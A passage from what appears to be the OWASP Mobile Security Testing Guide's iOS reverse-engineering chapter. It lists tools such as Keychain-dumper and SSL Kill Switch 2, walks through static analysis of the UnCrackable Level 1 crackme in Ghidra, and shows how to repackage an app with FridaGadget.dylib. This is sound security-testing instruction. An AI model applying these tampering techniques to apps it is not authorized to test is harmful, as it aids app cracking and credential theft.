  Cydia Impactor - \url{http://www.cydiaimpactor.com/}
\item
  Frida - \url{https://www.frida.re}
\item
  Frida-ios-dump - \url{https://github.com/AloneMonkey/frida-ios-dump}
\item
  IDB - \url{https://www.idbtool.com}
\item
  iFunBox - \url{http://www.i-funbox.com/}
\item
  Introspy - \url{https://github.com/iSECPartners/Introspy-iOS}
\item
  ios-deploy - \url{https://github.com/ios-control/ios-deploy}
\item
  IPA Installer Console -
  \url{https://cydia.saurik.com/package/com.autopear.installipa}
\item
  ipainstaller - \url{https://github.com/autopear/ipainstaller}
\item
  iProxy - \url{https://iphonedevwiki.net/index.php/SSH_Over_USB}
\item
  ITMS services asset downloader -
  \url{https://www.npmjs.com/package/itms-services}
\item
  Keychain-dumper - \url{https://github.com/ptoomey3/Keychain-Dumper/}
\item
  libimobiledevice - \url{https://www.libimobiledevice.org/}
\item
  MobSF - \url{https://github.com/MobSF/Mobile-Security-Framework-MobSF}
\item
  Needle - \url{https://github.com/mwrlabs/needle}
\item
  Objection - \url{https://github.com/sensepost/objection}
\item
  Passionfruit - \url{https://github.com/chaitin/passionfruit/}
\item
  Radare2 - \url{https://github.com/radare/radare2}
\item
  Sileo - \url{https://cydia-app.com/sileo/}
\item
  SSL Kill Switch 2 -
  \url{https://github.com/nabla-c0d3/ssl-kill-switch2}
\item
  TablePlus - \url{https://tableplus.io/}
\item
  Usbmuxd - \url{https://github.com/libimobiledevice/usbmuxd}
\item
  Wireshark - \url{https://www.wireshark.org/download.html}
\item
  Xcode - \url{https://developer.apple.com/xcode/}
\end{itemize}

\hypertarget{tampering-and-reverse-engineering-on-ios}{%
\subsection{Tampering and Reverse Engineering on
iOS}\label{tampering-and-reverse-engineering-on-ios}}

\hypertarget{reverse-engineering-1}{%
\subsubsection{Reverse Engineering}\label{reverse-engineering-1}}

iOS reverse engineering is a mixed bag. On one hand, apps programmed in
Objective-C and Swift can be disassembled nicely. In Objective-C, object
methods are called via dynamic function pointers called ``selectors'',
which are resolved by name during runtime. The advantage of runtime name
resolution is that these names need to stay intact in the final binary,
making the disassembly more readable. Unfortunately, this also means
that no direct cross-references between methods are available in the
disassembler and constructing a flow graph is challenging.

In this guide, we'll introduce static and dynamic analysis and
instrumentation. Throughout this chapter, we refer to the
\href{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes\#ios}{OWASP
UnCrackable Apps for iOS}, so download them from the MSTG repository if
you're planning to follow the examples.

\hypertarget{tooling-1}{%
\paragraph{Tooling}\label{tooling-1}}

Make sure that the following is installed on your system:

\begin{itemize}
\item
  \href{http://stevenygard.com/projects/class-dump/}{class-dump by Steve
  Nygard} is a command line utility for examining the Objective-C
  runtime information stored in Mach-O (Mach object) files. It generates
  declarations for the classes, categories, and protocols.
\item
  \href{https://code.google.com/archive/p/networkpx/wikis/class_dump_z.wiki}{class-dump-z}
  is class-dump re-written from scratch in C++, avoiding the use of
  dynamic calls. Removing these unnecessary calls makes class-dump-z
  nearly 10 times faster than its predecessor.
\item
  \href{https://github.com/limneos/classdump-dyld/}{class-dump-dyld by
  Elias Limneos} allows symbols to be dumped and retrieved directly from
  the shared cache, eliminating the necessity of extracting the files
  first. It can generate header files from app binaries, libraries,
  frameworks, bundles, or the whole dyld\_shared\_cache. Directories or
  the entirety of dyld\_shared\_cache can be recursively mass-dumped.
\item
  \href{https://github.com/DerekSelander/dsdump}{dsdump} is a tool to
  dump Objective-C classes and Swift type descriptors (classes, structs,
  enums). It only supports Swift version 5 or higher and does not
  support ARM 32-bit binaries.
\item
  \href{https://sourceforge.net/projects/machoview/}{MachoOView} is a
  useful visual Mach-O file browser that also allows in-file editing of
  ARM binaries.
\item
  \href{http://www.manpagez.com/man/1/otool/}{otool} is a tool for
  displaying specific parts of object files or libraries. It works with
  Mach-O files and universal file formats.
\item
  \href{http://www.manpagez.com/man/1/nm/osx-10.12.6.php}{nm} is a tool
  that displays the name list (symbol table) of the given binary.
\item
  \href{https://rada.re/r/}{Radare2} is a complete framework for reverse
  engineering and analyzing. It is built with the Capstone disassembler
  engine, Keystone assembler, and Unicorn CPU emulation engine. Radare2
  supports iOS binaries and many useful iOS-specific features, such as a
  native Objective-C parser and an iOS debugger.
\item
  \href{https://ghidra-sre.org/}{Ghidra} is a software reverse
  engineering (SRE) suite of tools developed by NSA's Research
  Directorate. This tool has been discussed in
  ``\href{0x04c-Tampering-and-Reverse-Engineering.md\#ghidra}{Ghidra}''
  section.
\end{itemize}

\hypertarget{building-a-reverse-engineering-environment-for-free-1}{%
\subparagraph{Building a Reverse Engineering Environment for
Free}\label{building-a-reverse-engineering-environment-for-free-1}}

Be sure to follow the instructions from the section ``Setting up Xcode
and Command Line Tools'' of chapter ``iOS Basic Security Testing''. This
way you'll have properly installed
\href{https://developer.apple.com/xcode/ide/}{Xcode}. We'll be using
standard tools that come with macOS and Xcode in addition to the tools
mentioned above. Make sure you have the
\href{https://railsapps.github.io/xcode-command-line-tools.html}{Xcode
command line developer tools} properly installed or install them
straight away from your terminal:

\begin{verbatim}
$ xcode-select --install
\end{verbatim}

\begin{itemize}
\tightlist
\item
  \href{http://www.manpagez.com/man/1/xcrun/}{\texttt{xcrun}} can be
  used invoke Xcode developer tools from the command-line, without
  having them in the path. For example you may want to use it to locate
  and run swift-demangle or simctl.
\item
  swift-demangle is an Xcode tool that demangles Swift symbols. For more
  information run \texttt{xcrun\ swift-demangle\ -help} once installed.
\item
  simctl is an Xcode tool that allows you to interact with iOS
  simulators via the command line to e.g.~manage simulators, launch
  apps, take screenshots or collect their logs.
\end{itemize}

\hypertarget{commercial-tools-1}{%
\subparagraph{Commercial Tools}\label{commercial-tools-1}}

Building a reverse engineering environment for free is possible.
However, there are some commercial alternatives. The most commonly used
are:

\begin{itemize}
\item
  \href{https://www.hex-rays.com/products/ida/}{IDA Pro} can deal with
  iOS binaries. It has a built-in iOS debugger. IDA is widely seen as
  the gold standard for GUI-based interactive static analysis, but it
  isn't cheap. For the more budget-minded reverse engineer,
  \href{https://www.hopperapp.com/}{Hopper} offers similar static
  analysis features.
\item
  \href{https://www.hopperapp.com/}{Hopper} is a reverse engineering
  tool for macOS and Linux used to disassemble, decompile and debug
  32/64bits Intel Mac, Linux, Windows and iOS executables.
\end{itemize}

\hypertarget{disassembling-and-decompiling-1}{%
\paragraph{Disassembling and
Decompiling}\label{disassembling-and-decompiling-1}}

Because Objective-C and Swift are fundamentally different, the
programming language in which the app is written affects the
possibilities for reverse engineering it. For example, Objective-C
allows method invocations to be changed at runtime. This makes hooking
into other app functions (a technique heavily used by
\href{http://www.cycript.org/}{Cycript} and other reverse engineering
tools) easy. This ``method swizzling'' is not implemented the same way
in Swift, and the difference makes the technique harder to execute with
Swift than with Objective-C.

On iOS, all the application code (both Swift and Objective-C) is
compiled to machine code (e.g.~ARM). Thus, to analyze iOS applications a
disassembler is needed.

If you want to disassemble an application from the App Store, remove the
Fairplay DRM first. Section
``\href{0x06b-Basic-Security-Testing.md\#acquiring-the-app-binary}{Acquiring
the App Binary}'' in the chapter ``iOS Basic Security Testing'' explains
how.

In this section the term ``app binary'' refers to the Macho-O file in
the application bundle which contains the compiled code, and should not
be confused with the application bundle - the IPA file. See section
``\href{0x06b-Basic-Security-Testing.md\#exploring-the-app-package}{Exploring
the App Package}'' in chapter ``Basic iOS Security Testing'' for more
details on the composition of IPA files.

\hypertarget{disassembling-with-ida-pro}{%
\subparagraph{Disassembling With IDA
Pro}\label{disassembling-with-ida-pro}}

If you have a license for IDA Pro, you can analyze the app binary using
IDA Pro as well.

\begin{quote}
The free version of IDA unfortunately does not support the ARM processor
type.
\end{quote}

To get started, simply open the app binary in IDA Pro.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/7670982e5e0675cd414876d6c2505da3b7519c33.png}
\caption{IDA Pro open a Mach-O file}
\end{figure}

Upon opening the file, IDA Pro will perform auto-analysis, which can
take a while depending on the size of the binary. Once the auto-analysis
is completed you can browse the disassembly in the \textbf{IDA View}
(Disassembly) window and explore functions in the \textbf{Functions}
window, both shown in the screenshot below.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/6ae07a22cc86ccf206cc62961a54d037a436add3.png}
\caption{IDA Pro main window}
\end{figure}

A regular IDA Pro license does not include a decompiler by default and
requires an additional license for the Hex-Rays decompiler, which is
expensive. In contrast, Ghidra comes with a very capable free builtin
decompiler, making it a compelling alternative to use for reverse
engineering.

If you have a regular IDA Pro license and do not want to buy the
Hex-Rays decompiler, you can use Ghidra's decompiler by installing the
\href{https://github.com/Cisco-Talos/GhIDA/}{GhIDA plugin} for IDA Pro.

The majority of this chapter applies to applications written in
Objective-C or having bridged types, which are types compatible with
both Swift and Objective-C. The Swift compatibility of most tools that
work well with Objective-C is being improved. For example, Frida
supports \href{https://github.com/frida/frida-swift}{Swift bindings}.

\hypertarget{static-analysis-51}{%
\subsubsection{Static Analysis}\label{static-analysis-51}}

The preferred method of statically analyzing iOS apps involves using the
original Xcode project files. Ideally, you will be able to compile and
debug the app to quickly identify any potential issues with the source
code.

Black box analysis of iOS apps without access to the original source
code requires reverse engineering. For example, no decompilers are
available for iOS apps (although most commercial and open-source
disassemblers can provide a pseudo-source code view of the binary), so a
deep inspection requires you to read assembly code.

\hypertarget{basic-information-gathering-2}{%
\paragraph{Basic Information
Gathering}\label{basic-information-gathering-2}}

You can use class-dump to get information about methods in the
application's source code. The example below uses the
\href{http://damnvulnerableiosapp.com/}{Damn Vulnerable iOS App} to
demonstrate this. Our binary is a so-called fat binary, which means that
it can be executed on 32- and 64-bit platforms:

\begin{verbatim}
$ unzip DamnVulnerableiOSApp.ipa

$ cd Payload/DamnVulnerableIOSApp.app

$ otool -hv DamnVulnerableIOSApp

DamnVulnerableIOSApp (architecture armv7):
Mach header
     magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
  MH_MAGIC     ARM         V7  0x00     EXECUTE    38       4292   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

DamnVulnerableIOSApp (architecture arm64):
Mach header
     magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64   ARM64        ALL  0x00     EXECUTE    38       4856   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE
\end{verbatim}

Note the architectures: \texttt{armv7} (which is 32-bit) and
\texttt{arm64}. This design of a fat binary allows an application to be
deployed on all devices. To analyze the application with class-dump, we
must create a so-called thin binary, which contains one architecture
only:

\begin{verbatim}
iOS8-jailbreak:~ root# lipo -thin armv7 DamnVulnerableIOSApp -output DVIA32
\end{verbatim}

And then we can proceed to performing class-dump:

\begin{verbatim}
iOS8-jailbreak:~ root# class-dump DVIA32

@interface FlurryUtil : ./DVIA/DVIA/DamnVulnerableIOSApp/DamnVulnerableIOSApp/YapDatabase/Extensions/Views/Internal/
{
}
+ (BOOL)appIsCracked;
+ (BOOL)deviceIsJailbroken;
\end{verbatim}

Note the plus sign, which means that this is a class method that returns
a BOOL type. A minus sign would mean that this is an instance method.
Refer to later sections to understand the practical difference between
these.

Alternatively, you can easily decompile the application with
\href{https://www.hopperapp.com/}{Hopper Disassembler}. All these steps
would be executed automatically, and you'd be able to see the
disassembled binary and class information.

The following command is listing shared libraries:

\begin{verbatim}
$ otool -L <binary>
\end{verbatim}

\hypertarget{manual-reversed-code-review-1}{%
\paragraph{Manual (Reversed) Code
Review}\label{manual-reversed-code-review-1}}

\hypertarget{reviewing-disassembled-objective-c-and-swift-code}{%
\subparagraph{Reviewing Disassembled Objective-C and Swift
Code}\label{reviewing-disassembled-objective-c-and-swift-code}}

In this section we will be exploring iOS application's binary code
manually and perform static analysis on it. Manual analysis can be a
slow process and requires immense patience. A good manual analysis can
make the dynamic analysis more successful.

There are no hard written rules for performing static analysis, but
there are few rules of thumb which can be used to have a systematic
approach to manual analysis:

\begin{itemize}
\tightlist
\item
  Understand the working of the application under evaluation - the
  objective of the application and how it behaves in case of wrong
  input.
\item
  Explore the various strings present in the application binary, this
  can be very helpful, for example in spotting interesting
  functionalities and possible error handling logic in the application.
\item
  Look for functions and classes having names relevant to our objective.
\item
  Lastly, find the various entry points into the application and follow
  along from there to explore the application.
\end{itemize}

\begin{quote}
Techniques discussed in this section are generic and applicable
irrespective of the tools used for analysis.
\end{quote}

Objective-C

In addition to the techniques learned in the
``\protect\hyperlink{disassembling-and-decompiling}{Disassembling and
Decompiling}'' section, for this section you'll need some understanding
of the
\href{https://developer.apple.com/documentation/objectivec/objective-c_runtime}{Objective-C
runtime}. For instance, functions like \texttt{\_objc\_msgSend} or
\texttt{\_objc\_release} are specially meaningful for the Objective-C
runtime.

We will be using the
\href{https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/iOS/Level_01/UnCrackable_Level1.ipa}{UnCrackable
Level 1 crackme app}, which has the simple goal of finding a
\emph{secret string} hidden somewhere in the binary. The application has
a single home screen and a user can interact via inputting custom
strings in the provided text field.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/58dbf28ff380c5c9e7a07711dd5b2f67ac2448ce.png}
\caption{Home screen of the UnCrackable Level 1 application"
height="650}
\end{figure}

When the user inputs the wrong string, the application shows a pop-up
with the ``Verification Failed'' message.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/6e69c2562dd8593aead2a562db4a760b9647d1f9.png}
\caption{Verification Failed Pop-Up" height="650}
\end{figure}

You can keep note of the strings displayed in the pop-up, as this might
be helpful when searching for the code where the input is processed and
a decision is being made. Luckily, the complexity and interaction with
this application is straightforward, which bodes well for our reversing
endeavors.

\begin{quote}
For static analysis in this section, we will be using Ghidra 9.0.4.
Ghidra 9.1\_beta auto-analysis has a bug and does not show the
Objective-C classes.
\end{quote}

We can start by checking the strings present in the binary by opening it
in Ghidra. The listed strings might be overwhelming at first, but with
some experience in reversing Objective-C code, you'll learn how to
\emph{filter} and discard the strings that are not really helpful or
relevant. For instance, the ones shown in screenshot below, which are
generated for the Objective-C runtime. Other strings might be helpful in
some cases, such as those containing symbols (function names, class
names, etc.) and we'll be using them when performing static analysis to
check if some specific function is being used.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/12bde274c195d950e097030a4d940aa69ef599dc.png}
\caption{Objective-C runtime strings}
\end{figure}

If we continue our careful analysis, we can spot the string,
``Verification Failed'', which is used for the pop-up when a wrong input
is given. If you follow the cross-references (Xrefs) of this string, you
will reach \texttt{buttonClick} function of the \texttt{ViewController}
class. We will look into the \texttt{buttonClick} function later in this
section. When further checking the other strings in the application,
only a few of them look a likely candidate for a \emph{hidden flag}. You
can try them and verify as well.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/d3aa388017c64db3d09718bc6afdc1b49657d0a1.png}
\caption{Interesting strings in UnCrackable application}
\end{figure}

Moving forward, we have two paths to take. Either we can start analyzing
the \texttt{buttonClick} function identified in the above step, or start
analyzing the application from the various entry points. In real world
situation, most times you will be taking the first path, but from a
learning perspective, in this section we will take the latter path.

An iOS application calls different predefined functions provided by the
iOS runtime depending on its the state within the
\href{https://developer.apple.com/documentation/uikit/app_and_environment/managing_your_app_s_life_cycle}{application
life cycle}. These functions are known as the entry points of the app.
For example:

\begin{itemize}
\tightlist
\item
  \texttt{{[}AppDelegate\ application:didFinishLaunchingWithOptions:{]}}
  is called when the application is started for the first time.
\item
  \texttt{{[}AppDelegate\ applicationDidBecomeActive:{]}} is called when
  the application is moving from inactive to active state.
\end{itemize}

Many applications execute critical code in these sections and therefore
they're normally a good starting point in order to follow the code
systematically.

Once we're done with the analysis of all the functions in the
\texttt{AppDelegate} class, we can conclude that there is no relevant
code present. The lack of any code in the above functions raises the
question - from where is the application's initialization code being
called?

Luckily the current application has a small code base, and we can find
another \texttt{ViewController} class in the \textbf{Symbol Tree} view.
In this class, function \texttt{viewDidLoad} function looks interesting.
If you check the documentation of
\href{https://developer.apple.com/documentation/uikit/uiviewcontroller/1621495-viewdidload}{\texttt{viewDidLoad}},
you can see that it can also be used to perform additional
initialization on views.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/4fa0bcc01f6c81e1c689a905d989b9ce170cd436.png}
\caption{Decompilation of viewDidLoad function}
\end{figure}

If we check the decompilation of this function, there are a few
interesting things going on. For instance, there is a call to a native
function at line 31 and a label is initialized with a \texttt{setHidden}
flag set to 1 in lines 27-29. You can keep a note of these observations
and continue exploring the other functions in this class. For brevity,
exploring the other parts of the function is left as an exercise for the
readers.

In our first step, we observed that the application verifies the input
string only when the UI button is pressed. Thus, analyzing the
\texttt{buttonClick} function is an obvious target. As earlier
mentioned, this function also contains the string we see in the pop-ups.
At line 29 a decision is being made, which is based on the result of
\texttt{isEqualString} (output saved in \texttt{uVar1} at line 23). The
input for the comparison is coming from the text input field (from the
user) and the value of the \texttt{label}. Therefore, we can assume that
the hidden flag is stored in that label.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/3aa39770f872dc479a47edc037663d4dd7117ffe.png}
\caption{Decompilation of buttonClick function}
\end{figure}

Now we have followed the complete flow and have all the information
about the application flow. We also concluded that the hidden flag is
present in a text label and in order to determine the value of the
label, we need to revisit \texttt{viewDidLoad} function, and understand
what is happening in the native function identified. Analysis of the
native function is discussed in
``\protect\hyperlink{reviewing-disassembled-native-code}{Reviewing
Disassembled Native Code}''.

\hypertarget{reviewing-disassembled-native-code-1}{%
\subparagraph{Reviewing Disassembled Native
Code}\label{reviewing-disassembled-native-code-1}}

Analyzing disassembled native code requires a good understanding of the
calling conventions and instructions used by the underlying platform. In
this section we are looking in ARM64 disassembly of the native code. A
good starting point to learn about ARM architecture is available at
\href{https://azeria-labs.com/writing-arm-assembly-part-1/}{Introduction
to ARM Assembly Basics} by Azeria Labs Tutorials. This is a quick
summary of the things that we will be using in this section:

\begin{itemize}
\tightlist
\item
  In ARM64, a register is of 64 bit in size and referred to as Xn, where
  n is a number from 0 to 31. If the lower (LSB) 32 bits of the register
  are used then it's referred to as Wn.
\item
  The input parameters to a function are passed in the X0-X7 registers.
\item
  The return value of the function is passed via the X0 register.
\item
  Load (LDR) and store (STR) instructions are used to read or write to
  memory from/to a register.
\item
  B, BL, BLX are branch instructions used for calling a function.
\end{itemize}

As mentioned above as well, Objective-C code is also compiled to native
binary code, but analyzing C/C++ native can be more challenging. In case
of Objective-C there are various symbols (especially function names)
present, which eases the understanding of the code. In the above section
we've learned that the presence of function names like \texttt{setText},
\texttt{isEqualStrings} can help us in quickly understanding the
semantics of the code. In case of C/C++ native code, if all the binaries
are stripped, there can be very few or no symbols present to assist us
into analyzing it.

Decompilers can help us in analyzing native code, but they should be
used with caution. Modern decompilers are very sophisticated and among
many techniques used by them to decompile code, a few of them are
heuristics based. Heuristics based techniques might not always give
correct results, one such case being, determining the number of input
parameters for a given native function. Having knowledge of analyzing
disassembled code, assisted with decompilers can make analyzing native
code less error prone.

We will be analyzing the native function identified in
\texttt{viewDidLoad} function in the previous section. The function is
located at offset 0x1000080d4. The return value of this function used in
the \texttt{setText} function call for the label. This text is used to
compare against the user input. Thus, we can be sure that this function
will be returning a string or equivalent.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/07ef2bb02fa4cf9a0fd9f84179a1244d413cb209.png}
\caption{Disassembly of the native function}
\end{figure}

The first thing we can see in the disassembly of the function is that
there is no input to the function. The registers X0-X7 are not read
throughout the function. Also, there are multiple calls to other
functions like the ones at 0x100008158, 0x10000dbf0 etc.

The instructions corresponding to one such function calls can be seen
below. The branch instruction \texttt{bl} is used to call the function
at 0x100008158.

\begin{verbatim}
1000080f0 1a 00 00 94     bl         FUN_100008158
1000080f4 60 02 00 39     strb       w0,[x19]=>DAT_10000dbf0
\end{verbatim}

The return value from the function (found in W0), is stored to the
address in register X19 (\texttt{strb} stores a byte to the address in
register). We can see the same pattern for other function calls, the
returned value is stored in X19 register and each time the offset is one
more than the previous function call. This behavior can be associated
with populating each index of a string array at a time. Each return
value is been written to an index of this string array. There are 11
such calls, and from the current evidence we can make an intelligent
guess that length of the hidden flag is 11. Towards the end of the
disassembly, the function returns with the address to this string array.

\begin{verbatim}
100008148 e0 03 13 aa     mov        x0=>DAT_10000dbf0,x19
\end{verbatim}

To determine the value of the hidden flag we need to know the return
value of each of the subsequent function calls identified above. When
analyzing the function 0x100006fb4, we can observe that this function is
much bigger and more complex than the previous one we analyzed. Function
graphs can be very helpful when analyzing complex functions, as it helps
into better understanding the control flow of the function. Function
graphs can be obtained in Ghidra by clicking the \textbf{Display
function graph} icon in the sub-menu.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/65bd1b73aeaa3a7034682bc1d4b2c3b203ad8d79.png}
\caption{Function graph from 0x100006fb4}
\end{figure}

Manually analyzing all the native functions completely will be time
consuming and might not be the wisest approach. In such a scenario using
a dynamic analysis approach is highly recommended. For instance, by
using the techniques like hooking or simply debugging the application,
we can easily determine the returned values. Normally it's a good idea
to use a dynamic analysis approach and then fallback to manually
analyzing the functions in a feedback loop. This way you can benefit
from both approaches at the same time while saving time and reducing
effort. Dynamic analysis techniques are discussed in
``\protect\hyperlink{dynamic-analysis}{Dynamic Analysis}'' section.

\hypertarget{automated-static-analysis-1}{%
\paragraph{Automated Static
Analysis}\label{automated-static-analysis-1}}

Several automated tools for analyzing iOS apps are available; most of
them are commercial tools. The free and open source tools
\href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}
and \href{https://github.com/mwrlabs/needle}{Needle} have some static
and dynamic analysis functionality. Additional tools are listed in the
``Static Source Code Analysis'' section of the ``Testing Tools''
appendix.

Don't shy away from using automated scanners for your analysis - they
help you pick low-hanging fruit and allow you to focus on the more
interesting aspects of analysis, such as the business logic. Keep in
mind that static analyzers may produce false positives and false
negatives; always review the findings carefully.

\hypertarget{dynamic-analysis-48}{%
\subsubsection{Dynamic Analysis}\label{dynamic-analysis-48}}

Life is easy with a jailbroken device: not only do you gain easy
privileged access to the device, the lack of code signing allows you to
use more powerful dynamic analysis techniques. On iOS, most dynamic
analysis tools are based on Cydia Substrate, a framework for developing
runtime patches, or Frida, a dynamic introspection tool. For basic API
monitoring, you can get away with not knowing all the details of how
Substrate or Frida work - you can simply use existing API monitoring
tools.

\hypertarget{dynamic-analysis-on-non-jailbroken-devices}{%
\paragraph{Dynamic Analysis on Non-Jailbroken
Devices}\label{dynamic-analysis-on-non-jailbroken-devices}}

\hypertarget{automated-repackaging-with-objection}{%
\subparagraph{Automated Repackaging with
Objection}\label{automated-repackaging-with-objection}}

\href{https://github.com/sensepost/objection}{Objection} is a mobile
runtime exploration toolkit based on Frida. One of the biggest
advantages about Objection is that it enables testing with
non-jailbroken devices. It does this by automating the process of app
repackaging with the \texttt{FridaGadget.dylib} library. A detailed
explanation of the repackaging and resigning process can be found in the
next chapter ``Manual Repackaging''. We won't cover Objection in detail
in this guide, as you can find exhaustive documentation on the official
\href{https://github.com/sensepost/objection/wiki}{wiki pages}.

\hypertarget{manual-repackaging}{%
\subparagraph{Manual Repackaging}\label{manual-repackaging}}

If you don't have access to a jailbroken device, you can patch and
repackage the target app to load a dynamic library at startup. This way,
you can instrument the app and do pretty much everything you need to do
for a dynamic analysis (of course, you can't break out of the sandbox
this way, but you won't often need to). However, this technique works
only if the app binary isn't FairPlay-encrypted (i.e., obtained from the
App Store).

Thanks to Apple's confusing provisioning and code-signing system,
re-signing an app is more challenging than you would expect. iOS won't
run an app unless you get the provisioning profile and code signature
header exactly right. This requires learning many concepts-certificate
types, Bundle IDs, application IDs, team identifiers, and how Apple's
build tools connect them. Getting the OS to run a binary that hasn't
been built via the default method (Xcode) can be a daunting process.

We'll use \texttt{optool}, Apple's build tools, and some shell commands.
Our method is inspired by
\href{https://github.com/vtky/Swizzler2/}{Vincent Tan's Swizzler
project}.
\href{https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/}{The
NCC group} has described an alternative repackaging method.

To reproduce the steps listed below, download
\href{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/iOS/Level_01}{UnCrackable
iOS App Level 1} from the OWASP Mobile Testing Guide repository. Our
goal is to make the UnCrackable app load \texttt{FridaGadget.dylib}
during startup so we can instrument the app with Frida.

\begin{quote}
Please note that the following steps apply to macOS only, as Xcode is
only available for macOS.
\end{quote}

\hypertarget{getting-a-developer-provisioning-profile-and-certificate}{%
\subparagraph{Getting a Developer Provisioning Profile and
Certificate}\label{getting-a-developer-provisioning-profile-and-certificate}}

The \emph{provisioning profile} is a plist file signed by Apple. It
whitelists your code-signing certificate on one or more devices. In
other words, this represents Apple explicitly allowing your app to run
for certain reasons, such as debugging on selected devices (development
profile). The provisioning profile also includes the \emph{entitlements}
granted to your app. The \emph{certificate} contains the private key
you'll use to sign.

Depending on whether you're registered as an iOS developer, you can
obtain a certificate and provisioning profile in one of the following
ways:

\textbf{With an iOS developer account:}

If you've developed and deployed iOS apps with Xcode before, you already
have your own code-signing certificate installed. Use the
\emph{security} tool to list your signing identities:

\begin{verbatim}
$ security find-identity -v
 1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE "iPhone Distribution: Vantage Point Security Pte. Ltd."
 2) 8004380F331DCA22CC1B47FB1A805890AE41C938 "iPhone Developer: Bernhard Müller (RV852WND79)"
\end{verbatim}

Log into the Apple Developer portal to issue a new App ID, then issue
and download the profile. An App ID is a two-part string: a Team ID
supplied by Apple and a bundle ID search string that you can set to an
arbitrary value, such as \texttt{com.example.myapp}. Note that you can
use a single App ID to re-sign multiple apps. Make sure you create a
\emph{development} profile and not a \emph{distribution} profile so that
you can debug the app.

In the examples below, I use my signing identity, which is associated
with my company's development team. I created the App ID
``sg.vp.repackaged'' and the provisioning profile ``AwesomeRepackaging''
for these examples. I ended up with the file
\texttt{AwesomeRepackaging.mobileprovision}-replace this with your own
filename in the shell commands below.

\textbf{With a Regular Apple ID:}

Apple will issue a free development provisioning profile even if you're
not a paying developer. You can obtain the profile via Xcode and your
regular Apple account: simply create an empty iOS project and extract
\texttt{embedded.mobileprovision} from the app container, which is in
the Xcode subdirectory of your home directory:
\texttt{\textasciitilde{}/Library/Developer/Xcode/DerivedData/\textless{}ProjectName\textgreater{}/Build/Products/Debug-iphoneos/\textless{}ProjectName\textgreater{}.app/}.
The
\href{https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/}{NCC
blog post ``iOS instrumentation without jailbreak''} explains this
process in great detail.

Once you've obtained the provisioning profile, you can check its
contents with the \emph{security} tool. You'll find the entitlements
granted to the app in the profile, along with the allowed certificates
and devices. You'll need these for code-signing, so extract them to a
separate plist file as shown below. Have a look at the file contents to
make sure everything is as expected.

\begin{verbatim}
$ security cms -D -i AwesomeRepackaging.mobileprovision > profile.plist
$ /usr/libexec/PlistBuddy -x -c 'Print :Entitlements' profile.plist > entitlements.plist
$ cat entitlements.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
 <key>application-identifier</key>
 <string>LRUD9L355Y.sg.vantagepoint.repackage</string>
 <key>com.apple.developer.team-identifier</key>
 <string>LRUD9L355Y</string>
 <key>get-task-allow</key>
 <true/>
 <key>keychain-access-groups</key>
 <array>
   <string>LRUD9L355Y.*</string>
 </array>
</dict>
</plist>
\end{verbatim}

Note the application identifier, which is a combination of the Team ID
(LRUD9L355Y) and Bundle ID (sg.vantagepoint.repackage). This
provisioning profile is only valid for the app that has this App ID. The
\texttt{get-task-allow} key is also important: when set to
\texttt{true}, other processes, such as the debugging server, are
allowed to attach to the app (consequently, this would be set to
\texttt{false} in a distribution profile).

\hypertarget{other-preparations}{%
\subparagraph{Other Preparations}\label{other-preparations}}

To make our app load an additional library at startup, we need some way
of inserting an additional load command into the main executable's
Mach-O header. \href{https://github.com/alexzielenski/optool}{Optool}
can be used to automate this process:

\begin{verbatim}
$ git clone https://github.com/alexzielenski/optool.git
$ cd optool/
$ git submodule update --init --recursive
$ xcodebuild
$ ln -s <your-path-to-optool>/build/Release/optool /usr/local/bin/optool
\end{verbatim}

We'll also use
\href{https://github.com/ios-control/ios-deploy}{ios-deploy}, a tool
that allows iOS apps to be deployed and debugged without Xcode:

\begin{verbatim}
$ git clone https://github.com/ios-control/ios-deploy.git
$ cd ios-deploy/
$ xcodebuild
$ cd build/Release
$ ./ios-deploy
$ ln -s <your-path-to-ios-deploy>/build/Release/ios-deploy /usr/local/bin/ios-deploy
\end{verbatim}

The last line in both the optool and ios-deploy code snippets creates a
symbolic link and makes the executable available system-wide.

Reload your shell to make the new commands available:

\begin{verbatim}
zsh: # . ~/.zshrc
bash: # . ~/.bashrc
\end{verbatim}

\hypertarget{basic-information-gathering-3}{%
\paragraph{Basic Information
Gathering}\label{basic-information-gathering-3}}

On iOS, collecting basic information about a running process or an
application can be slightly more challenging than compared to Android.
On Android (or any Linux-based OS), process information is exposed as
readable text files via \emph{procfs}. Thus, any information about a
target process can be obtained on a rooted device by parsing these text
files. In contrast, on iOS there is no procfs equivalent present. Also,
on iOS many standard UNIX command line tools for exploring process
information, for instance lsof and vmmap, are removed to reduce the
firmware size.

In this section, we will learn how to collect process information on iOS
using command line tools like lsof. Since many of these tools are not
present on iOS by default, we need to install them via alternative
methods. For instance, lsof can be installed using Cydia (the executable
